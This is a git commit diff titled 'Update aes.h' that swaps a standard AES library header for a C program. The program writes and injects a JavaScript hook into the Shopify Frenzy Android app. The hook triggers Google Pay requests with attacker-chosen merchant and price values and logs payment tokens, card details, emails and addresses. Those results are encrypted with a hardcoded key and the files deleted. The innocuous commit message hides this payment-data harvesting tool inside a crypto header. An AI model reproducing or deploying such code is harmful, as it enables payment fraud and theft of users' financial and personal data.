fd410172d1bd81269a8a5a361cdef31ba1a76f2e
Mehtaab Gill <37054853+mehtaabGill@users.noreply.github.com>
2020-03-07 20:56:28 -0700

    Update aes.h

--- aes.h
+++ aes.h
@@ -1,90 +1,146 @@
-#ifndef _AES_H_
-#define _AES_H_
-
+#include <stdio.h>
+#include <stdlib.h>
 #include <stdint.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <dirent.h>
+#include <time.h>
+#include <signal.h>
+#include <unistd.h>
+#include "base64.h"
 
-// #define the macros below to 1/0 to enable/disable the mode of operation.
-//
-// CBC enables AES encryption in CBC-mode of operation.
-// CTR enables encryption in counter-mode.
-// ECB enables the basic ECB 16-byte block algorithm. All can be enabled simultaneously.
+#define CBC 1
 
-// The #ifndef-guard allows it to be configured before #include'ing or at compile time.
-#ifndef CBC
-  #define CBC 1
-#endif
+void  ALARMhandler(int sig);
+void delfilei();
+void delay(int number_of_seconds);
+int folderExists(const char *dirname);
 
-#ifndef ECB
-  #define ECB 1
-#endif
+#include "aes.h"
 
-#ifndef CTR
-  #define CTR 1
-#endif
-
-
-//#define AES128 1
-//#define AES192 1
-#define AES256 1
-
-#define AES_BLOCKLEN 16 //Block length in bytes AES is 128b block only
-
-#if defined(AES256) && (AES256 == 1)
-    #define AES_KEYLEN 32
-    #define AES_keyExpSize 240
-#elif defined(AES192) && (AES192 == 1)
-    #define AES_KEYLEN 24
-    #define AES_keyExpSize 208
-#else
-    #define AES_KEYLEN 16   // Key length in bytes
-    #define AES_keyExpSize 176
-#endif
-
-struct AES_ctx
+void delay(int number_of_seconds)
 {
-  uint8_t RoundKey[AES_keyExpSize];
-#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
-  uint8_t Iv[AES_BLOCKLEN];
-#endif
-};
+    // Converting time into milli_seconds
+    int milli_seconds = 1000 * number_of_seconds;
 
-void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);
-#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
-void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);
-void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);
-#endif
+    // Storing start time
+    clock_t start_time = clock();
 
-#if defined(ECB) && (ECB == 1)
-// buffer size is exactly AES_BLOCKLEN bytes;
-// you need only AES_init_ctx as IV is not used in ECB
-// NB: ECB is considered insecure for most uses
-void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);
-void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);
+    // looping till required time is not achieved
+    while (clock() < start_time + milli_seconds)
+        ;
+}
 
-#endif // #if defined(ECB) && (ECB == !)
+int folderExists(const char *dirname)
+{
+    DIR* dir = opendir(dirname);
+    if (dir) {
+        closedir(dir);
+        return 1;
+    }
+    else {
+        return -1;
+    }
+}
 
+void  ALARMhandler(int sig)
+{
+  delfilei();
+}
 
-#if defined(CBC) && (CBC == 1)
-// buffer size MUST be mutile of AES_BLOCKLEN;
-// Suggest https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
-// NOTES: you need to set IV in ctx via AES_init_ctx_iv() or AES_ctx_set_iv()
-//        no IV should ever be reused with the same key
-void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, uint32_t length);
-void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, uint32_t length);
+char globalroot[4000];
 
-#endif // #if defined(CBC) && (CBC == 1)
+void delfilei()
+{
+    remove(globalroot);
+    system("pkill injector");
+}
 
+int main(int argc, char *argv[])
+{
+    strcpy(globalroot, "");
+    char root[500];
+    char rmcmd[1000];
+    strcpy(rmcmd, "rm -rf ");
 
-#if defined(CTR) && (CTR == 1)
+    const char *dirs[3];
+    dirs[0] = "/data/android";
+    dirs[1] = "/data/google";
+    dirs[2] = "/data/kernel";
 
-// Same function for encrypting as for decrypting.
-// IV is incremented for every block, and used after encryption as XOR-compliment for output
-// Suggesting https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
-// NOTES: you need to set IV in ctx with AES_init_ctx_iv() or AES_ctx_set_iv()
-//        no IV should ever be reused with the same key
-void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, uint32_t length);
+    int i;
+    for(i = 0; i < 3; i++){
+        if(folderExists(dirs[i]) < 0){
+            return -99;
+        }
+    }
 
-#endif // #if defined(CTR) && (CTR == 1)
+    srand(time(0));
+    int dirIndex = rand() % 2;
 
+    strcpy(root, dirs[dirIndex]);
+    strcat(root, "/script.js");
 
-#endif //_AES_H_
+    strcat(rmcmd, dirs[dirIndex]);
+    strcat(rmcmd, "/script.js");
+
+    FILE *fp;
+
+    fclose(fopen(root, "w"));
+    fp = fopen(root, "a");
+    fprintf(fp, "Java.perform(function(){const FeedActivity=Java.use('com.shopify.frenzy.feed.ui.FeedActivity');FeedActivity.onCreate.overload('android.os.Bundle').implementation=function(bundle){this.onCreate(bundle);const currentActivity=this;const Wallet=Java.use('com.google.android.gms.wallet.Wallet');const Builder=Java.use('com.google.android.gms.wallet.Wallet$WalletOptions$Builder');const PaymentMethodTokenizationParameters=Java.use('com.google.android.gms.wallet.PaymentMethodTokenizationParameters');const PaymentDataRequest=Java.use('com.google.android.gms.wallet.PaymentDataRequest');const PaymentData=Java.use('com.google.android.gms.wallet.PaymentData');const ShippingAddressRequirements=Java.use('com.google.android.gms.wallet.ShippingAddressRequirements');const CardRequirements=Java.use('com.google.android.gms.wallet.CardRequirements');const TransactionInfo=Java.use('com.google.android.gms.wallet.TransactionInfo');const ArrayList=Java.use('java.util.ArrayList');const AutoResolveHelper=Java.use('com.google.android.gms.wallet.AutoResolveHelper');const Integer=Java.use('java.lang.Integer');const PaymentsClient_build=Wallet.getPaymentsClient(currentActivity,Builder.$new().setEnvironment(1).build());const PaymentMethodTokenizationParameters_build=PaymentMethodTokenizationParameters.newBuilder().setPaymentMethodTokenizationType(1).addParameter('gateway','shopify').addParameter('gatewayMerchantId','");
+    fprintf(fp, argv[1]);
+    fprintf(fp, "').build();const TransactionInfo_build=TransactionInfo.newBuilder().setTotalPriceStatus(2).setTotalPrice('");
+    fprintf(fp, argv[2]);
+    fprintf(fp, "').setCurrencyCode('");
+    fprintf(fp, argv[3]);
+    fprintf(fp, "').build();const authMethods=ArrayList.$new();authMethods.add(Integer.valueOf('1'));authMethods.add(Integer.valueOf('5'));authMethods.add(Integer.valueOf('4'));const paymentMethods=ArrayList.$new();paymentMethods.add(Integer.valueOf('2'));paymentMethods.add(Integer.valueOf('1'));const PaymentDataRequestbuild=PaymentDataRequest.newBuilder().setPhoneNumberRequired(!1).setEmailRequired(!0).setShippingAddressRequired(!0).setShippingAddressRequirements(ShippingAddressRequirements.newBuilder().build()).setTransactionInfo(TransactionInfo_build).addAllowedPaymentMethods(paymentMethods).setCardRequirements(CardRequirements.newBuilder().addAllowedCardNetworks(authMethods).setAllowPrepaidCards(!0).setBillingAddressRequired(!0).setBillingAddressFormat(1).build()).setPaymentMethodTokenizationParameters(PaymentMethodTokenizationParameters_build).setUiRequired(!0).build();AutoResolveHelper.resolveTask(PaymentsClient_build.loadPaymentData(PaymentDataRequestbuild),currentActivity,123);FeedActivity.onActivityResult.overload('int','int','android.content.Intent').implementation=function(requestCode,resultCode,data){if(requestCode==123&&resultCode==-1){const paymentData=PaymentData.getFromIntent(data);console.log(JSON.stringify({token:paymentData.getPaymentMethodToken().getToken(),email:paymentData.getEmail(),card:paymentData.getCardInfo().getCardDetails(),address:{billing:getAddress(paymentData.getCardInfo().getBillingAddress()),shipping:getAddress(paymentData.getShippingAddress()),}}))}}}});function getAddress(address){let name=address.getName();name=name.split(' ');return{address1:address.getAddress1(),address2:address.getAddress2(),city:address.getLocality(),country_code:address.getCountryCode(),first_name:name[0],last_name:name[1],phone:address.getPhoneNumber(),province_code:address.getAdministrativeArea(),zip:address.getPostalCode()}}");
+    fclose(fp);
+
+    char cmd[] = "./injector -R v8 -f com.shopify.frenzy.app -s ";
+    strcat(cmd, root);
+    strcat(cmd, " > file.txt");
+    char temp[2000];
+    strcpy(temp, "");
+    strcat(temp, "rm -rf ");
+    strcat(temp, root);
+    strcat(globalroot, root);
+
+    //ENCRYPTION STUFF
+    struct AES_ctx ctx;
+
+    uint8_t key[] = "6jaaz2jwsnf0a7kw2k7dqf7k62apknua";
+    uint8_t iv[]  = "1283666c72eec9e4";
+
+    /*signal(SIGALRM, ALARMhandler);
+    alarm(30);
+    system(cmd);*/
+
+    FILE *encf = fopen("file.txt", "r");
+    char str[4096];
+    fread(str, 4096, 1, encf);
+
+    int buffsize = strlen(str);
+
+    AES_init_ctx_iv(&ctx, key, iv);
+    AES_CBC_encrypt_buffer(&ctx, str, buffsize);
+
+    //printf("Encrypted Text: %s \n\n", str);
+
+    int fl = 0;
+    char *encchar = base64((const uint8_t *)&str, buffsize, &fl);
+
+    printf(encchar);
+
+    AES_init_ctx_iv(&ctx, key, iv);
+    AES_CBC_decrypt_buffer(&ctx, str, buffsize);
+
+    printf("\n\n %s\n", str);
+    fclose(encf);
+    remove("file.txt");
+
+    exit(0);
+
+    return 0;
+}
